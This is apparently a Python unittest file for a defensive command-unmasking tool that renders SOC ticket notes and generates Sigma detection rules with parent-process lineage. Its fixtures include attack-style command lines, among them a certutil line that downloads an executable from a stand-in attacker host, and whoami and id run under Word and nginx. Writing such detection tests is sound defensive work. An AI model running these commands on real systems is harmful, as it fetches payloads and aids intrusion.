import unittest

from cmd_unmask.renderer import (
    build_soc_ticket_note,
    render_markdown,
    render_pretty,
)
from cmd_unmask.sigma import generate_sigma_rule, render_sigma_yaml
from cmd_unmask.unpacker import unmask_command


class TestLineageRendererAndSigma(unittest.TestCase):
    def test_renderer_shows_process_chain_when_present_and_omits_when_none(self):
        with_lineage = unmask_command(
            "powershell.exe -NoP -Command Get-Date",
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        )
        note = build_soc_ticket_note(with_lineage)
        self.assertIn("Process Chain :", note)
        self.assertIn("WINWORD.EXE -> ", note)

        pretty = render_pretty([with_lineage], color=False)
        self.assertIn("Chain:", pretty)
        self.assertIn("WINWORD.EXE ->", pretty)

        md = render_markdown([with_lineage])
        self.assertIn("**Process Chain**:", md)
        self.assertIn("WINWORD.EXE -> ", md)

        without_lineage = unmask_command("powershell.exe -NoP -Command Get-Date")
        self.assertNotIn("Process Chain", build_soc_ticket_note(without_lineage))
        self.assertNotIn("Process Chain", render_pretty([without_lineage], color=False))
        self.assertNotIn("Process Chain", render_markdown([without_lineage]))

    def test_sigma_emits_parent_image_when_present_and_omits_when_none(self):
        with_lineage = unmask_command(
            "cmd.exe /c whoami",
            image="C:\\Windows\\System32\\cmd.exe",
            parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        )
        rule = generate_sigma_rule(with_lineage)
        self.assertIsNotNone(rule)
        selection = rule.detection.get("selection", {})
        self.assertEqual(selection.get("ParentImage|endswith"), "*\\winword.exe")
        yaml_text = render_sigma_yaml(rule)
        self.assertIn("ParentImage|endswith:", yaml_text)
        self.assertIn("*\\winword.exe", yaml_text)

        # POSIX parent image
        posix_verdict = unmask_command(
            "sh -c id",
            image="/bin/sh",
            parent_image="/usr/sbin/nginx",
        )
        posix_rule = generate_sigma_rule(posix_verdict)
        self.assertIsNotNone(posix_rule)
        self.assertEqual(
            posix_rule.detection.get("selection", {}).get("ParentImage|endswith"),
            "*/nginx",
        )

        # Without parent_image -> omitted cleanly
        without_lineage = unmask_command(
            "certutil.exe -urlcache -split -f http://cdn.evil.example/a.exe a.exe"
        )
        rule_no_parent = generate_sigma_rule(without_lineage)
        self.assertIsNotNone(rule_no_parent)
        self.assertNotIn("ParentImage|endswith", rule_no_parent.detection.get("selection", {}))
        self.assertNotIn("ParentImage|endswith", render_sigma_yaml(rule_no_parent))


if __name__ == "__main__":
    unittest.main()
